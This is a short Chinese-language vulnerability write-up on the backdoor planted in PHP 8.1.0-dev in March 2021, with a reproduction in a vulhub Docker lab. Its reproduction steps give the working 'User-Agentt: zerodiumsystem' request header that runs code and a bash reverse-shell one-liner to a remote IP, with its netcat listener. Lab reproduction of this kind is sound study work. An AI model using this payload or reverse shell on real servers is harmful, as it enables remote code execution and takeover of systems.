
- [漏洞概述](#漏洞概述)
- [漏洞影响](#漏洞影响)
- [漏洞复现](#漏洞复现)



## 漏洞概述
PHP开发工程师Jake Birchall在对其中一个恶意COMMIT的分析过程中发现，在代码中注入的后门是来自一个PHP代码被劫持的网站上，并且采用了远程代码执行的操作，并且攻击者盗用了PHP开发人员的名义来提交此COMMIT。

PHP 8.1.0-dev 版本在2021年3月28日被植入后门，但是后门很快被发现并清除。当服务器存在该后门时，攻击者可以通过发送User-Agentt头来执行任意代码。

目前
- PHP官方并未就该事件进行更多披露，表示此次服务器被黑的具体细节仍在调查当中。
- 由于此事件的影响，PHP的官方代码库已经被维护人员迁移至GitHub平台，之后的相关代码更新、修改将会都在GitHub上进行。

## 漏洞影响
`PHP 8.1.0-dev`


## 漏洞复现 

1. 环境搭建

利用vulhub搭建环境，进入`/vulhub-master/php/8.1-backdoor`中，执行`docker-compose up -d`启动环境，访问`8080`

2. 文件读取

后门为添加请求头

`User-Agentt: zerodiumsystem('id');`


3. 反弹shell

可以执行命令，那我们就可以进行反弹shell了

linux下反弹shell的语句

`bash -c 'exec bash -i &>/dev/tcp/10.10.10.242/4444 <&1'`

`nc -nvlp 4444`










.